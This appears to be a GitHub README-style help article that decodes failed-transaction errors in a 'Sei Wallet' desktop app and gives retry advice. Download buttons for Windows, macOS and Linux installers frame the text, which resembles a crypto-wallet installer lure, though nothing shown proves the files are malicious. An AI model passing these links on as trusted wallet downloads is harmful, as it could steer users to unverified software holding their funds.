![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">A failed Sei Wallet transaction: what each error means</h1>

<p align="center">Read the error, find the cause, and stop repeating the same attempt.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

A failed transaction is a completed transaction with a negative result. The chain executed it, decided it could not succeed, reverted the state change, and kept the fee. Nothing moved except the fee, and the error string is the only useful evidence you have.

This article decodes the errors that actually appear, in the order they appear, and says what each one asks you to change.

## Where to look

Open [the transaction list](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) in the app, copy the hash, and open it on a block explorer. You want three fields: status, gas used, and the revert reason if one was recorded.

If the status says pending rather than failed, stop here - [the Sei Wallet pending transaction guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) is the right diagnosis, and the actions are different.

## The errors, decoded

<div align="center">

| Message | What it means | What to change |
|---|---|---|
| `insufficient funds for gas` | Liquid balance below amount + fee | Reduce the amount, or add SEI |
| `insufficient funds for transfer` | Amount plus fee exceeds balance | Same, at the amount level |
| `execution reverted` | The contract refused the call | Read the reason; usually a rule or a limit |
| `out of gas` | Gas limit too low for the work | Raise the limit for that call |
| `nonce too low` | That nonce is already used | Nothing - the earlier transaction confirmed |
| `replacement transaction underpriced` | Replacement fee too close to the original | Raise the fee meaningfully |
| `chain id mismatch` / wrong network | Signed for another chain | Switch the wallet to 1329 |
| `transaction reverted without a reason` | Revert with no message | Retry once; if it repeats, treat as a rule |

</div>

Two general notes. First, a fee is charged in every row of that table - the work happened. Second, the amount never leaves your account on a revert; only the fee does.

## The three that are really about balance

`insufficient funds` is the most common failure and the most misread. It does not always mean "you are out of money". It means the balance cannot cover the amount **plus** the fee, and the fee is charged in the same asset.

The trap that produces it repeatedly is staking: an account with everything bonded has no liquid SEI, so every transaction fails at this check, including the unbonding transaction that would fix it. The exit is a small transfer in from elsewhere - the deadlock is described in [what the fee covers](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md).

A second trap: leaving the balance just above the amount but below amount-plus-fee. Send slightly less than you hold, not exactly what you hold.

## The contract errors

`execution reverted` means the contract or the chain rejected the operation, and the reason string is the actual answer. Common ones:

- **Slippage or deadline** on a swap: the price moved past your limit, or the deadline passed. Retry with a wider tolerance only if you accept the worse price.
- **Paused or restricted contract**: the application itself is refusing. Nothing on your side changes it.
- **Approval missing**: a token operation needs an allowance first, which is a separate transaction.
- **Staking rules**: redelegation limits, an amount below a minimum, or an unbonding that conflicts with an existing entry.

If the reason is empty, retry once. If it reverts identically, it is a rule rather than a glitch, and repeating it wastes fees.

## Nonce errors, which are not failures

`nonce too low` usually means the transaction you thought failed actually succeeded earlier, or a duplicate was submitted. Check the balance and the earlier transaction before doing anything else.

`replacement transaction underpriced` means you tried to replace a pending transaction with a fee too close to the original. Raise it by a clear margin. Both errors are about ordering rather than about the transfer itself.

## What to keep, and what to send to support

Keep the hash, the time, the amount, and the exact error text. A screenshot of the explorer page is enough. Support cannot reverse a confirmed transaction, but it can explain a specific error if the message is ambiguous.

What not to send: your seed phrase, your private key, or a screen share of your wallet. No error in this article requires any of them, and any request for them is [a wrong-address transfer](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)-style scam wearing a support hat.

## After a failure, before a retry

1. Confirm the status is failed, not pending.
2. Read the reason, and change exactly one thing - the amount, the fee limit, or the recipient.
3. Check the network is 1329.
4. Check that a liquid balance remains after the new fee.
5. Retry once, and if it fails identically, stop and read the reason again.

Retrying an unchanged transaction is the most common way to pay the same fee twice for the same error.

## Failures that are not your transaction

**A deposit to an exchange that never credited.** The chain succeeded; the exchange has not credited. That is a ticket, and [the memo field](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) is the first thing to check.

**A transfer that arrived nowhere.** If it confirmed and the destination is not yours, it is not a failed transaction at all - it is a completed one, and final.

**A balance that looks wrong after a success.** Check the account and the network before assuming a failure. A confirmed transfer that succeeded did what it said.

## If you arrived from Compass

One failure pattern is specific to migrations: sending from an older wallet to an address that the receiving app cannot sign for. The transaction succeeds and the funds sit in a view you cannot act on. [The Sei Wallet Compass migration guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) describes the address handover that avoids it.

## Frequently asked questions

**Why did my transaction fail if I had enough SEI?** Because the fee is separate from the amount. The balance must cover both, in the same asset.

**Do I get the fee back?** No. The fee pays for computation that happened, even when the result was a revert.

**Did I lose the amount?** No. A revert leaves the amount in your account; only the fee is spent.

**What does `execution reverted` mean in plain terms?** The contract or the chain refused the operation, usually because a rule was not met. The reason string names the rule when the contract provides one.

**Should I retry immediately?** Only after changing something. An identical retry usually fails identically.

**Can a failed transaction be reversed?** No. It is already final; nothing was transferred, and the record stays.

**Is `nonce too low` a problem?** Usually not. It means that transaction already exists, so check whether the earlier one succeeded.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [Sei gas fees and what Sei Wallet shows before you sign](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md)
- [Sent SEI to the wrong address from Sei Wallet: what is recoverable](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)
